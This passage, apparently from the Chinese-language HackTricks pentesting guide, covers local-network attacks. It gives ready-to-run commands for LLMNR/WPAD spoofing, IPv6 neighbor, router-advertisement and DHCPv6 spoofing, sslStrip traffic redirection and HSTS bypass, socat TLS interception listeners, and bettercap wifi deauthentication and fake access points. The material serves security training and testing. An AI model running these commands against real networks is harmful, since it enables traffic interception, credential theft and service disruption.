dig @localhost domain.example.com # Test the configured DNS
```
### 本地网关

系统和网络通常存在多个路由。在本地网络中建立 MAC 地址列表后，使用 _gateway-finder.py_ 来识别支持 IPv4 转发的主机。
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

对于当 DNS 查询失败时的本地主机解析，Microsoft 系统依赖于 **Link-Local Multicast Name Resolution (LLMNR)** 和 **NetBIOS Name Service (NBT-NS)**。类似地，**Apple Bonjour** 和 **Linux zero-configuration** 实现利用 **Multicast DNS (mDNS)** 在网络中发现系统。由于这些协议的无认证特性及其通过 UDP 广播消息的操作，攻击者可以利用它们将用户重定向到恶意服务。

您可以使用 Responder 冒充被主机搜索的服务，发送虚假响应。\
在这里阅读更多关于 [如何使用 Responder 冒充服务](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 的信息。

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

浏览器通常使用 **Web Proxy Auto-Discovery (WPAD) 协议自动获取代理设置**。这涉及从服务器获取配置细节，具体通过一个 URL，例如 "http://wpad.example.org/wpad.dat"。客户端可以通过多种机制发现此服务器：

- 通过 **DHCP**，其中发现通过使用特殊代码 252 条目来促进。
- 通过 **DNS**，这涉及在本地域中搜索标记为 _wpad_ 的主机名。
- 通过 **Microsoft LLMNR 和 NBT-NS**，这些是 DNS 查询未成功时使用的后备机制。

工具 Responder 利用此协议，充当 **恶意 WPAD 服务器**。它使用 DHCP、DNS、LLMNR 和 NBT-NS 误导客户端连接到它。要深入了解如何使用 Responder 冒充服务 [请查看这个](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)。

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

您可以在网络中提供不同的服务，以尝试 **欺骗用户** 输入一些 **明文凭据**。**关于此攻击的更多信息在** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**。**

### IPv6 Neighbor Spoofing

此攻击与 ARP Spoofing 非常相似，但在 IPv6 世界中。您可以让受害者认为 GW 的 IPv6 拥有攻击者的 MAC。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 路由器广告欺骗/洪水攻击

一些操作系统默认通过网络中发送的 RA 数据包配置网关。要将攻击者声明为 IPv6 路由器，可以使用：
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP欺骗

默认情况下，一些操作系统尝试通过读取网络中的DHCPv6数据包来配置DNS。然后，攻击者可以发送一个DHCPv6数据包，将自己配置为DNS。DHCP还为受害者提供了一个IPv6地址。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (假页面和JS代码注入)

## 互联网攻击

### sslStrip

基本上，这个攻击的作用是，在**用户**尝试**访问**一个**HTTP**页面并**重定向**到**HTTPS**版本时，**sslStrip**将**保持**与**客户端的HTTP连接**和与**服务器的HTTPS连接**，这样它就能够以**明文**方式**嗅探**连接。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
更多信息 [这里](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)。

### sslStrip+ 和 dns2proxy 绕过 HSTS

**sslStrip+ 和 dns2proxy** 与 **sslStrip** 的**区别**在于它们会**重定向**例如 _**www.facebook.com**_ **到** _**wwww.facebook.com**_（注意**多出的**“**w**”），并将**该域名的地址设置为攻击者 IP**。这样，**客户端**将**连接**到 _**wwww.facebook.com**_ **（攻击者）**，但在后台**sslstrip+**将**通过 https 维护**与 **www.facebook.com** 的**真实连接**。

该技术的**目标**是**避免 HSTS**，因为 _**wwww**.facebook.com_ **不会**被保存在**浏览器的缓存**中，因此浏览器会被欺骗以在 HTTP 中执行**facebook 认证**。\
请注意，为了执行此攻击，受害者必须最初尝试访问 [http://www.faceook.com](http://www.faceook.com)，而不是 https。这可以通过修改 http 页面中的链接来实现。

更多信息 [这里](https://www.bettercap.org/legacy/#hsts-bypass)，[这里](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) 和 [这里](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)。

**sslStrip 或 sslStrip+ 不再有效。这是因为浏览器中预先保存了 HSTS 规则，因此即使用户第一次访问“重要”域名，他也会通过 HTTPS 访问。此外，请注意，预先保存的规则和其他生成的规则可以使用标志** [**`includeSubdomains`**](https://hstspreload.appspot.com) **，因此之前的 _**wwww.facebook.com**_ **示例将不再有效，因为** _**facebook.com**_ **使用 HSTS 和 `includeSubdomains`。**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP 监听端口
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL 在端口监听

#### 生成密钥和自签名证书
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 使用证书监听
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 使用证书监听并重定向到主机
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
有时，如果客户检查到CA是有效的，您可以**提供由CA签署的其他主机名的证书**。\
另一个有趣的测试是**提供请求的主机名但自签名的证书**。

其他测试内容是尝试用一个有效的证书签署该证书，但该证书不是有效的CA。或者使用有效的公钥，强制使用一种算法，如Diffie-Hellman（不需要用真实私钥解密的算法），当客户请求真实私钥的探测（如哈希）时，发送一个假探测，并期望客户不检查这个。

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### 主动发现笔记

请注意，当UDP数据包发送到没有请求端口的设备时，会发送一个ICMP（端口不可达）消息。

### **ARP发现**

ARP数据包用于发现网络中正在使用的IP。PC必须为每个可能的IP地址发送请求，只有正在使用的IP会响应。

### **mDNS（多播DNS）**

Bettercap每隔X毫秒发送一个MDNS请求，询问**\_services\_.dns-sd.\_udp.local**，看到这个数据包的机器通常会回答这个请求。然后，它只搜索回答“services”的机器。

**工具**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS（NetBios名称服务器）**

Bettercap广播数据包到端口137/UDP，询问名称“CKAAAAAAAAAAAAAAAAAAAAAAAAAAA”。

### **SSDP（简单服务发现协议）**

Bettercap广播SSDP数据包，搜索各种服务（UDP端口1900）。

### **WSD（Web服务发现）**

Bettercap广播WSD数据包，搜索服务（UDP端口3702）。

## 参考文献

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **网络安全评估：了解您的网络（第三版）**
- **实用物联网黑客：攻击物联网的权威指南。作者：Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
